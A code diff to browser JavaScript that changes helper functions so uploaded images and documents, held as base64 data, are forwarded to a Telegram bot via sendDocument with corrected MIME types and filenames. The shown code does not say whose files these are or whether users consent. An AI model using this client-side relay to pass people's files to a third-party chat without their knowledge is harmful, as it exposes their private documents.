@@ -278,51 +278,49 @@
             }
         }
 
-        // Helper function to send photo to bot (better for images)
+        // Helper function to send photo to bot - sends as document for better downloadability
         async function sendPhotoToBot(botToken, chatId, base64Data, fileName, caption) {
+            // Use sendDocument instead of sendPhoto for better file handling and downloadability
+            return await sendDocumentToBot(botToken, chatId, base64Data, fileName, caption + ' (Photo)');
+        }
+
+        // Helper function to send document to bot - ensures downloadable files
+        async function sendDocumentToBot(botToken, chatId, base64Data, fileName, caption) {
             try {
-                // Convert base64 to blob
+                // Convert base64 to blob with proper type
                 const response = await fetch(base64Data);
                 const blob = await response.blob();
                 
-                // Create FormData for photo
+                // Get the file extension from the original filename
+                const fileExt = fileName.split('.').pop().toLowerCase();
+                const mimeTypes = {
+                    'jpg': 'image/jpeg',
+                    'jpeg': 'image/jpeg',
+                    'png': 'image/png',
+                    'gif': 'image/gif',
+                    'pdf': 'application/pdf',
+                    'doc': 'application/msword',
+                    'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+                };
+                const mimeType = mimeTypes[fileExt] || blob.type || 'application/octet-stream';
+                
+                // Create a new blob with proper MIME type
+                const properBlob = new Blob([blob], { type: mimeType });
+                
+                // Create FormData with proper filename
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, fileName);
-                formData.append('caption', caption + '\n📅 ' + new Date().toLocaleString());
+                formData.append('document', properBlob, fileName);
+                formData.append('caption', caption + '\n📅 ' + new Date().toLocaleString() + '\n💾 File: ' + fileName);
 
-                const result = await fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
+                const result = await fetch('https://api.telegram.org/bot' + botToken + '/sendDocument', {
                     method: 'POST',
                     body: formData
                 });
                 
                 const resultData = await result.json();
-                console.log('Photo sent:', resultData.ok);
+                console.log('Document sent:', resultData.ok);
                 return resultData;
-            } catch (err) {
-                console.log('Error sending photo, trying document method:', err);
-                // Fallback to document method
-                return await sendDocumentToBot(botToken, chatId, base64Data, fileName, caption);
-            }
-        }
-
-        // Helper function to send document to bot
-        async function sendDocumentToBot(botToken, chatId, base64Data, fileName, caption) {
-            try {
-                // Convert base64 to blob
-                const response = await fetch(base64Data);
-                const blob = await response.blob();
-                
-                // Create FormData
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('document', blob, fileName);
-                formData.append('caption', caption);
-
-                await fetch('https://api.telegram.org/bot' + botToken + '/sendDocument', {
-                    method: 'POST',
-                    body: formData
-                });
             } catch (err) {
                 console.log('Error sending document:', err);
             }
